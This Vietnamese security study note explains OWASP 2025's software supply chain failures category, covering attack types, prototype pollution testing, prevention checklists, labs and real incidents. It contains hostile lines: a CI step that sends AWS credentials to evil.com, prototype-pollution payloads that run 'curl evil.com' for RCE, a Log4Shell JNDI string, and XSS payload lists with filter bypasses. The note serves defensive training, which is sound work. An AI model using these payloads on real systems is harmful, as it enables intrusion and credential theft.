# A03 – Software Supply Chain Failures

> **OWASP Top 10:2025 · #3** — Danh mục **mới hoàn toàn** trong OWASP 2025, được cộng đồng bình chọn #1 trong community survey (50% respondents xếp hạng này đầu tiên). Mở rộng từ "A9 – Using Components with Known Vulnerabilities" (2013), scope nay bao phủ toàn bộ chuỗi cung ứng phần mềm: dependency, CI/CD pipeline, IDE extension, container image, artifact repository, và cả third-party vendor. Highest average incidence rate trong toàn bộ Top 10 ở **5.72%**.

| Metric | Số liệu |
|---|---|
| CWE được map | 6 |
| CVEs liên quan | 11 |
| Tổng số lần xuất hiện | 215,248 |
| Tỉ lệ xuất hiện trung bình | 5.72% |
| Avg Weighted Exploit | 8.17 (cao nhất Top 10) |

Notable CWEs: **CWE-1395** (Dependency on Vulnerable Third-Party Component), **CWE-1104** (Use of Unmaintained Third Party Components), **CWE-1329** (Reliance on Component That is Not Updateable).

---

## 📖 Concept

Software Supply Chain Failures là **điểm yếu hoặc xâm phạm trong quá trình build, phân phối, hoặc cập nhật phần mềm** — thường do lỗ hổng hoặc thay đổi độc hại trong code, tool, hoặc dependency của bên thứ ba.

> ⚠️ Không như các lỗ hổng khác — attacker không cần tấn công trực tiếp vào ứng dụng của bạn. Họ tấn công **nhà cung cấp, thư viện, hoặc tool** mà bạn tin tưởng. Một package bị compromised có thể ảnh hưởng hàng nghìn ứng dụng cùng lúc.

### Ba vector chính của Supply Chain Attack

| Vector | Mô tả | Ví dụ thực tế |
|---|---|---|
| **Vulnerable dependency** | Dùng thư viện có CVE đã biết | Log4Shell (CVE-2021-44228) |
| **Malicious package** | Package giả mạo hoặc bị inject malware | npm worm Shai-Hulud (2025) |
| **Compromised vendor/tool** | Vendor bị tấn công, push update độc hại | SolarWinds (2019), Bybit (2025) |

### Ứng dụng có thể bị tấn công nếu:

- Không track version của **tất cả** component — cả direct và **transitive dependency**
- Dùng software lỗi thời, không được support, hoặc không patch
- Không scan vulnerability định kỳ và không subscribe security bulletin
- Không có change management cho supply chain (CI/CD, IDE, image registry, artifact repo)
- Component lấy từ **nguồn không tin cậy** hoặc không verify integrity
- CI/CD pipeline có security yếu hơn hệ thống nó build và deploy
- Không có **separation of duty** — một người có thể write code và promote thẳng lên production

---

## 🎯 Các dạng tấn công

### 1. Dependency Confusion — `Critical`

Attacker publish package lên public registry (npm, PyPI) với **tên trùng package nội bộ** nhưng version số cao hơn. Package manager ưu tiên public registry → tải về malicious package thay vì internal.

```
# Công ty có internal package tên "company-auth" version 1.0
# Attacker publish lên npm: "company-auth" version 9.0 (chứa malware)
# npm install company-auth → tải version 9.0 từ public npm!

# Tương tự với PyPI, RubyGems, NuGet
pip install company-internal-utils   # → malicious version từ PyPI
```

> 💡 Alex Birsan (2021) dùng kỹ thuật này để xâm nhập Apple, Microsoft, PayPal và hơn 30 công ty lớn khác — tất cả đều legal trong bug bounty.

---

### 2. Typosquatting — `High`

Publish package với tên **gần giống** package phổ biến để đánh lừa developer gõ nhầm.

```
# Package thật       → Package giả (typosquatting)
requests             → request (thiếu s)
lodash               → 1odash (số 1 thay chữ l)
cross-env            → crossenv (không có dấu gạch)
jquery               → Jquery, JQuery, j-query
event-stream         → eventstream

# Thực tế: "event-stream" attack (2018)
# Malicious maintainer thêm dependency "flatmap-stream"
# Chứa code đánh cắp Bitcoin wallet của Copay app
# Đã download 8 triệu lần trước khi bị phát hiện
```

---

### 3. Known Vulnerable Dependencies — `High`

Dùng thư viện có **CVE đã biết** mà chưa patch.

```bash
# Kiểm tra dependency có CVE không
npm audit                          # Node.js
pip-audit                          # Python
mvn dependency-check:check         # Java (OWASP Dependency Check)
bundle audit                       # Ruby

# Ví dụ output npm audit:
# critical  Remote Code Execution
# Package: lodash
# Patched in: >=4.17.21
# Dependency of: my-app
# More info: https://npmjs.com/advisories/1523
```

**Các CVE landmark trong supply chain:**

| CVE | Package | Impact |
|---|---|---|
| CVE-2021-44228 (Log4Shell) | Apache Log4j | RCE toàn diện, ảnh hưởng hàng triệu server |
| CVE-2017-5638 | Apache Struts 2 | RCE, nguyên nhân breach Equifax (147M records) |
| CVE-2021-42574 | Trojan Source | Malicious Unicode trong source code |

---

### 4. Prototype Pollution — `High`

Lỗ hổng trong JavaScript library cho phép attacker **inject property lên `Object.prototype`** toàn cục, ảnh hưởng tất cả object trong ứng dụng. Đây là attack vector quan trọng khi dùng thư viện merge/clone object không an toàn.

**Cơ chế:**

```javascript
// Object.prototype là prototype gốc của MỌI object trong JS
// Nếu pollute được → tất cả object inherit property độc hại

// Source: URL query string
// /?__proto__[isAdmin]=true
// /?constructor[prototype][isAdmin]=true

// Gadget trong library xử lý merge:
function merge(target, source) {
    for (let key in source) {
        target[key] = source[key]; // Không filter __proto__!
    }
}

// Kết quả: Object.prototype.isAdmin = true
// → mọi {} trong app đều có isAdmin = true → privilege escalation
```

**Client-side prototype pollution → DOM XSS:**

```javascript
// Inject transport_url vào prototype
// /?__proto__[transport_url]=data:,alert(document.cookie)

// Gadget trong searchLogger.js của app:
let config = {};
if (config.transport_url) {  // ← inherit từ polluted prototype!
    let script = document.createElement('script');
    script.src = config.transport_url;  // ← XSS!
    document.body.appendChild(script);
}
```

**Server-side prototype pollution → RCE (Node.js):**

```javascript
// Inject vào JSON body:
{
  "__proto__": {
    "shell": "node",
    "NODE_OPTIONS": "--inspect=evil.com"
  }
}

// Hoặc bypass với constructor:
{
  "constructor": {
    "prototype": {
      "outputFunctionName": "x;process.mainModule.require('child_process').exec('curl evil.com')"
    }
  }
}
```

---

### 5. Compromised Vendor / Malicious Update — `Critical`

Vendor bị tấn công → push update độc hại → tất cả khách hàng tự động nhận malware khi update.

```
# Attack flow – SolarWinds model:
Attacker xâm nhập vendor build system
    ↓
Inject malicious code vào software update (SUNBURST malware)
    ↓
Vendor ký và distribute update bình thường (trusted!)
    ↓
~18,000 tổ chức cài update → bị compromise
    ↓
Lateral movement, data exfiltration tháng trời trước khi phát hiện
```

---

### 6. Malicious npm/PyPI Package (Worm) — `Critical`

Package tự lan truyền bằng cách **steal npm token** rồi dùng để publish malicious version của package khác.

```
# Shai-Hulud npm worm (2025) – first self-propagating supply chain worm:

1. Attacker seed malicious versions của popular packages
2. post-install script chạy khi developer npm install
3. Script harvest sensitive data → exfil lên public GitHub repo
4. Script detect npm tokens trong environment
5. Dùng token để publish malicious version của package khác
6. Worm tự lan sang >500 package versions trước khi bị chặn
```

> 💡 Developer machine là **prime target** — compromise developer = compromise toàn bộ pipeline.

---

### 7. Malicious CI/CD Pipeline — `High`

CI/CD có access đặc quyền đến codebase, secret, và production — nếu bị compromise thì attack surface cực lớn.

```yaml
# GitHub Actions bị inject malicious step:
- name: Build
  run: |
    npm install
    # Attacker thêm vào:
    curl evil.com/exfil?data=$(cat ~/.aws/credentials | base64)
    npm run build

# Hoặc qua compromised action:
- uses: some-vendor/build-action@v1  # action bị compromised
```

---

### ⚠️ Hai dạng hay bị bỏ sót

**Transitive dependency** — Package A (bạn dùng) → depend on B → depend on C (có CVE). Bạn không dùng C trực tiếp nhưng vẫn bị ảnh hưởng. `npm audit` và SBOM scan sẽ bắt được loại này.

**IDE Extension / Dev Tool attack** — Extension VSCode độc hại có thể đọc file, steal secret, exfil code. Developer thường không audit extension kỹ như production dependency. Glassworm (2025) là ví dụ: self-spreading worm target VSCode extensions.

---

## 🔍 Dấu hiệu nhận biết

| Mức độ | Dấu hiệu | Cần làm |
|---|---|---|
| 🔴 High | Dependency có CVE critical/high chưa patch | Chạy `npm audit` / `pip-audit` / OWASP Dependency Check |
| 🔴 High | JSON endpoint nhận input merge vào object JS | Test prototype pollution với `__proto__`, `constructor` |
| 🔴 High | Package version pin không chặt (`"lodash": "^4"`) | Lock version chính xác, dùng lockfile |
| 🟡 Med | Không có SBOM (Software Bill of Materials) | Không biết đang dùng gì → không thể track CVE |
| 🟡 Med | CI/CD chạy với quyền quá rộng | Review IAM, secret scope trong pipeline |
| 🟡 Med | URL query string ảnh hưởng JS object property | Fuzz với `__proto__[foo]=bar`, check `Object.prototype` |
| 🔵 Low | Dùng package tên lạ / gần giống package phổ biến | Verify trên npmjs.com: download count, author, age |
| 🔵 Low | Không có package integrity check (checksum) | Bật `npm ci` thay `npm install`, verify hash |

---

## 🧠 Attack Flow – Methodology

### Prototype Pollution Testing (Client-side)

```
1. Tìm prototype pollution source
   └─ Thử inject vào query string:
      /?__proto__[foo]=bar
      /?constructor[prototype][foo]=bar
      /#__proto__[foo]=bar  (hash/fragment)
   └─ Mở DevTools Console → gõ Object.prototype
   └─ Nếu thấy foo: "bar" → tìm được source!
   └─ Dùng DOM Invader (Burp built-in) để automate

2. Tìm gadget property
   └─ Đọc JavaScript source (Sources tab)
   └─ Tìm code dạng: if (config.X) { doSomethingWith(config.X) }
   └─ Gadget phổ biến: transport_url, hitCallback, innerHTML, src

3. Craft exploit
   └─ /?__proto__[transport_url]=data:,alert(document.cookie)
   └─ /?__proto__[hitCallback]=alert(document.cookie)
   └─ Dùng DOM Invader "Scan for gadgets" để tự động tìm

4. Escalate
   └─ DOM XSS → steal cookie, perform CSRF
   └─ Nếu gadget là script.src → full JS injection
```

### Prototype Pollution Testing (Server-side)

```
1. Tìm endpoint nhận JSON/object input
   └─ Thường là: profile update, preference save, merge/extend API

2. Inject vào JSON body (non-destructive probes):
   {
     "__proto__": { "foo": "bar" }
   }
   └─ Observe response: có reflect "foo" property không?
   └─ Dùng Burp Extension: "Server-Side Prototype Pollution Scanner"

3. Indirect detection (khi không thấy reflection):
   └─ Status code override: "__proto__": { "status": 555 }
   └─ JSON spaces: "__proto__": { "json spaces": 10 }
   └─ Charset override: "__proto__": { "content-type": "charset=utf-7" }

4. Escalate to RCE:
   └─ Tìm child_process sink (Node.js)
   └─ Inject NODE_OPTIONS, shell, execArgv
   └─ Dùng Burp Collaborator để detect blind RCE
```

### Dependency Audit Flow

```
1. Generate dependency list
   npm list --all --json    # Node.js
   pip list --format=json   # Python
   mvn dependency:tree      # Java

2. Scan CVE
   npm audit --audit-level=moderate
   pip-audit
   owasp-dependency-check --project myapp --scan ./

3. Check for typosquatting / suspicious packages
   └─ Verify trên registry: publish date, author, download stats
   └─ Dùng "confused" tool để detect dependency confusion risk

4. Generate SBOM
   cyclonedx-npm --output-file sbom.json
   syft . -o cyclonedx-json > sbom.json

5. Monitor ongoing
   └─ Subscribe GitHub Advisory Database alerts
   └─ Setup OWASP Dependency Track với SBOM
   └─ Check OSV.dev cho toàn bộ ecosystem
```

---

## 💣 Payloads

### Prototype Pollution – Sources

```javascript
// Query string (URL)
/?__proto__[foo]=bar
/?__proto__.foo=bar
/?constructor[prototype][foo]=bar

// JSON body
{ "__proto__": { "foo": "bar" } }
{ "constructor": { "prototype": { "foo": "bar" } } }

// URL fragment (hash)
/#__proto__[foo]=bar

// Bypass sanitization (double encoding)
/?__pro__proto__to__[foo]=bar
/?__proto__[foo%00]=bar
```

### Prototype Pollution – Gadgets → XSS

```javascript
// Gadget: transport_url (script src)
/?__proto__[transport_url]=data:,alert(document.cookie)

// Gadget: hitCallback (setTimeout/setInterval)
/#__proto__[hitCallback]=alert(document.cookie)

// Gadget: innerHTML
/?__proto__[innerHTML]=<img src=x onerror=alert(1)>

// Gadget: value (Object.defineProperty)
/?__proto__[value]=data:,alert(1)
```

### Server-side Prototype Pollution – Detection Probes

```json
// Status code override (non-destructive)
{ "__proto__": { "status": 555 } }

// JSON spaces (kiểm tra response formatting thay đổi không)
{ "__proto__": { "json spaces": "  " } }

// Charset override
{ "__proto__": { "content-type": "application/json; charset=utf-7" } }

// RCE via NODE_OPTIONS (Node.js)
{
  "__proto__": {
    "NODE_OPTIONS": "--require /proc/self/environ",
    "env": { "EVIL": "require('child_process').exec('curl evil.com')" }
  }
}
```

### Dependency Check Commands

```bash
# Node.js
npm audit
npm audit --audit-level=critical  # chỉ show critical
npm audit fix                     # auto fix nếu có
npm ci                            # install từ lockfile, verify integrity

# Python
pip-audit
pip-audit --fix                   # auto upgrade

# Java
mvn org.owasp:dependency-check-maven:check

# Ruby
bundle audit check --update

# Detect dependency confusion risk
pip install confused
confused -l npm package.json

# Generate SBOM (CycloneDX format)
npm install -g @cyclonedx/cyclonedx-npm
cyclonedx-npm --output-file sbom.json
```

---

## 🛡️ Prevention

### Nguyên tắc: Trust but Verify — và Prefer Signed

> Mọi dependency, tool, và update đều phải được verify integrity trước khi tin tưởng — dù đến từ nguồn đã dùng lâu năm. Supply chain attack thường xảy ra qua kênh tin tưởng.

### Checklist cho developer

- [ ] **Pin dependency version chính xác** — dùng lockfile (`package-lock.json`, `Pipfile.lock`), không dùng range operator (`^`, `~`, `*`)
- [ ] **Chạy `npm audit` / `pip-audit`** trong CI pipeline — block build nếu có critical CVE
- [ ] **Generate và maintain SBOM** — biết chính xác đang dùng gì, kể cả transitive dep
- [ ] **Subscribe security alerts** — GitHub Advisory, npm security advisories, NVD, OSV.dev
- [ ] **Verify package từ official registry** — kiểm tra author, download count, publish date trước khi dùng package mới
- [ ] **Enable Subresource Integrity (SRI)** cho CDN script trong HTML
- [ ] **Không merge user input trực tiếp vào object** trong Node.js — dùng `Object.create(null)` hoặc whitelist key
- [ ] **MFA cho tất cả tài khoản npm/PyPI** — prevent account takeover → malicious publish
- [ ] **Separation of duty trong CI/CD** — không ai được tự push code lên production không qua review
- [ ] **Scope secret theo môi trường** — CI secret không được có quyền production deploy

### Fix Prototype Pollution

```javascript
// ❌ Unsafe merge
function merge(target, source) {
    for (let key in source) {
        target[key] = source[key];
    }
}

// ✅ Safe merge: filter dangerous keys
function merge(target, source) {
    for (let key in source) {
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            continue;  // Skip!
        }
        target[key] = source[key];
    }
}

// ✅ Hoặc dùng Object.create(null) — không có prototype
const safeObj = Object.create(null);

// ✅ Hoặc dùng structuredClone() (Node 17+)
const clone = structuredClone(userInput);

// ✅ Schema validation trước khi process
const schema = Joi.object({ name: Joi.string(), age: Joi.number() });
const { value } = schema.validate(userInput);
```

### SRI cho CDN script

```html
<!-- ❌ Không verify integrity -->
<script src="https://cdn.example.com/jquery-3.6.0.min.js"></script>

<!-- ✅ Subresource Integrity: browser verify hash trước khi chạy -->
<script
  src="https://cdn.example.com/jquery-3.6.0.min.js"
  integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
  crossorigin="anonymous">
</script>

<!-- Generate SRI hash: -->
<!-- openssl dgst -sha256 -binary jquery.min.js | openssl base64 -A -->
```

### CI/CD Hardening

```yaml
# GitHub Actions – pin action version bằng commit hash, không dùng tag
- uses: actions/checkout@v4          # ❌ tag có thể bị move
- uses: actions/checkout@b4ffde...  # ✅ pinned commit hash

# Giới hạn permission
permissions:
  contents: read
  packages: write  # chỉ cấp quyền cần thiết

# Không dùng secret scope rộng
env:
  # ❌ Dùng production secret trong CI
  AWS_SECRET: ${{ secrets.PROD_AWS_SECRET }}
  # ✅ Dùng secret riêng cho CI với quyền tối thiểu
  AWS_SECRET: ${{ secrets.CI_AWS_SECRET }}
```

---

## 🧪 Labs – PortSwigger Web Security Academy

A03 không có lab riêng trên PortSwigger, nhưng **Prototype Pollution** là kỹ thuật tấn công quan trọng nhất liên quan — xảy ra do dùng thư viện JavaScript xử lý object merge không an toàn.

### Prototype Pollution – Client-side

| Lab | Level | Kỹ thuật |
|---|---|---|
| [DOM XSS via client-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution) | 🔴 Practitioner | URL `__proto__` → gadget `transport_url` → DOM XSS |
| [DOM XSS via an alternative prototype pollution vector](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector) | 🔴 Practitioner | Bypass `__proto__` block, dùng `constructor.prototype` |
| [Client-side prototype pollution via flawed sanitization](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization) | 🔴 Practitioner | Bypass sanitization dùng `__pro__proto__to__` |
| [Client-side prototype pollution in third-party libraries](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries) | 🔴 Practitioner | Gadget ẩn trong minified library, dùng DOM Invader |
| [Client-side prototype pollution via browser APIs](https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis) | 🔴 Practitioner | Gadget qua `Object.defineProperty`, bypass patch |

### Prototype Pollution – Server-side

| Lab | Level | Kỹ thuật |
|---|---|---|
| [Privilege escalation via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution) | 🔴 Practitioner | Pollute `isAdmin` → access admin panel |
| [Detecting server-side prototype pollution without polluted property reflection](https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection) | 🔴 Practitioner | Blind detection: status override, JSON spaces, charset |
| [Remote code execution via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution) | 🔴 Practitioner | Node.js child_process sink → RCE via `NODE_OPTIONS` |

---

## 🔧 Tools

| Tool | Mục đích |
|---|---|
| **npm audit / pip-audit** | Scan CVE trong dependency, built-in, free |
| **OWASP Dependency Check** | Scan multi-language, generate HTML/XML report |
| **OWASP Dependency Track** | Platform quản lý SBOM + monitor CVE realtime |
| **Syft** | Generate SBOM (SPDX, CycloneDX format) từ container/code |
| **Grype** | Scan SBOM hoặc container image tìm CVE |
| **Retire.js** | Detect known vulnerable JavaScript library trong web app |
| **confused** | Detect dependency confusion risk trong npm/PyPI/gem |
| **DOM Invader** (Burp) | Automate tìm prototype pollution source và gadget |
| **Server-Side PP Scanner** (Burp BApp) | Black-box detect server-side prototype pollution |
| **OSV.dev** | Tra CVE theo package và version, API free |
| **Socket.dev** | Real-time alert khi npm package có malicious behavior |

---

## 🌍 Real-world Cases

**Case 1 – SolarWinds (2019–2020): ~18,000 nạn nhân**

Attacker xâm nhập build server của SolarWinds, inject SUNBURST backdoor vào phần mềm Orion trước khi ký và phát hành. Khoảng 18,000 tổ chức — bao gồm nhiều cơ quan chính phủ Mỹ — tự động cài update và bị compromise. Backdoor nằm im hàng tháng trước khi bị FireEye phát hiện. Root cause: không có separation of duty trong build pipeline, không có integrity check cho artifact.

**Case 2 – Log4Shell (CVE-2021-44228): Hàng triệu server**

Apache Log4j — thư viện logging Java cực phổ biến — có lỗ hổng RCE zero-day. Một dòng log `${jndi:ldap://evil.com/a}` có thể trigger remote class loading và RCE. Vì Log4j là transitive dependency ẩn trong hàng trăm framework và product khác, nhiều team không biết mình đang dùng nó cho đến khi bị tấn công. Thời gian từ khi public đến exploit: vài giờ.

**Case 3 – event-stream npm attack (2018)**

Developer phổ biến transfer quyền maintain `event-stream` (2.5M downloads/tuần) cho một người lạ. Maintainer mới thêm dependency `flatmap-stream` chứa obfuscated code nhắm vào ví Bitcoin của app Copay (~2M user). Bị phát hiện sau nhiều tuần. Root cause: không audit dependency mới; quyền publish npm không cần verify.

**Case 4 – Bybit $1.5 Billion Theft (2025)**

Attacker compromise wallet management software mà Bybit dùng. Malicious code chỉ activate khi target wallet cụ thể đang được dùng — sophisticated conditional logic để bypass detection. Hậu quả: vụ trộm crypto lớn nhất lịch sử. Root cause: tin tưởng vendor mà không verify integrity của software update.

**Case 5 – Shai-Hulud npm Worm (2025)**

Worm npm đầu tiên tự lan truyền: seed malicious packages → post-install script exfil data và npm token → dùng token publish malicious version của package khác → tự nhân rộng sang >500 package versions. Nhắm vào developer machine, chứng minh developer environment là high-value target, không chỉ production server.

**Case 6 – Prototype Pollution trong lodash (CVE-2019-10744)**

Hàm `defaultsDeep()` của lodash (70M+ weekly downloads) bị prototype pollution. Code: `_.defaultsDeep({}, JSON.parse('{"__proto__": {"polluted": true}}'))` → inject property vào `Object.prototype` toàn app. Tất cả app Node.js dùng lodash version < 4.17.12 bị ảnh hưởng.

---

## 💡 Attacker Mindset

> **"Tấn công nhà cung cấp đáng tin cậy hiệu quả hơn tấn công mục tiêu trực tiếp."**

Nếu target có security tốt, attacker sẽ tìm điểm yếu trong chuỗi phụ thuộc. Một thư viện phổ biến bị compromise có thể tạo ra hàng nghìn nạn nhân cùng lúc — ROI cực cao cho attacker.

> **"Developer machine = high-value target."**

CI/CD token, cloud credential, SSH key, npm publish access — tất cả nằm trên máy developer. Compromise một laptop developer có thể dẫn đến supply chain attack toàn bộ org.

> **"Transitive dependency là blind spot lớn nhất."**

Team biết mình dùng `express`, nhưng express depend on gì? express → `path-to-regexp` → `debug` → ... Một CVE ở tầng sâu nhất vẫn ảnh hưởng tất cả layer trên. Chỉ SBOM mới cho thấy full picture.

> **"Mỗi khi thấy JSON được merge vào object JS: test `__proto__`."**

Profile update, settings save, query parameter được dùng để build object — đây là potential prototype pollution source. Server-side còn nguy hiểm hơn client-side vì có thể dẫn đến RCE trên Node.js.

---

## ✅ Quick Pentest Checklist

- [ ] Chạy `npm audit` / `pip-audit` → check critical CVE chưa patch
- [ ] Test prototype pollution: thêm `?__proto__[foo]=bar` vào URL
- [ ] Test JSON body: thêm `"__proto__": {"foo": "bar"}` → check Object.prototype
- [ ] Dùng DOM Invader để automate tìm client-side prototype pollution gadget
- [ ] Dùng Burp "Server-Side PP Scanner" cho Node.js app
- [ ] Kiểm tra `package.json` / `requirements.txt`: có version range không?
- [ ] Check có `package-lock.json` hay `lockfile` không?
- [ ] Verify integrity CDN script: có SRI hash không?
- [ ] Check CI/CD action version: dùng tag hay commit hash?
- [ ] Kiểm tra có SBOM không → đưa vào Dependency Track

---

*Nguồn: [OWASP Top 10:2025 – A03](https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/) · [PortSwigger – Prototype Pollution](https://portswigger.net/web-security/prototype-pollution) · [OSV.dev](https://osv.dev/) · [NVD](https://nvd.nist.gov)*
